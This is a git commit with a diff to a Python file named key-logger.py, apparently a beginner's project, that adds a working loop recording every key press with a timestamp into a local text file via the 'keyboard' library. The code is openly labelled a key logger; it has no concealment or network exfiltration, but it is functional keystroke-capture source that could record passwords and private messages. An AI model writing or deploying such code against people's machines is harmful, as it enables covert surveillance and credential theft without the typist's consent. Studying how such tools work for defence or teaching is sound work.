4a22492f248bcbb6b8899cad3b92f6acbf82c524
joshl <joshlee0143@gmail.com>
2026-02-27 17:36:57 -0500

    updated key-logger

--- key-logger.py
+++ key-logger.py
@@ -1,9 +1,13 @@
-# sources: https://www.w3schools.com/python/python_file_write.asp, https://www.geeksforgeeks.org/python/how-to-detect-if-a-specific-key-pressed-using-python/, https://www.w3schools.com/python/python_datetime.asp
+# sources: https://www.w3schools.com/python/python_file_write.asp, https://www.geeksforgeeks.org/python/how-to-detect-if-a-specific-key-pressed-using-python/, https://www.w3schools.com/python/python_datetime.asp, https://github.com/boppreh/keyboard
 
 import keyboard
 import datetime
 
-file = open("keylogs.txt", "a")
-
 while True:
-    if 
+    with open("keylogs.txt", "a") as logs_file:
+
+        # store all key presses as events until the 'Enter' key is pressed
+        events = keyboard.record(until='Enter')
+        for event in events:
+            if event.event_type == keyboard.KEY_DOWN:
+                logs_file.write(f"[{datetime.datetime.now()}]: '{event.name}'\n")
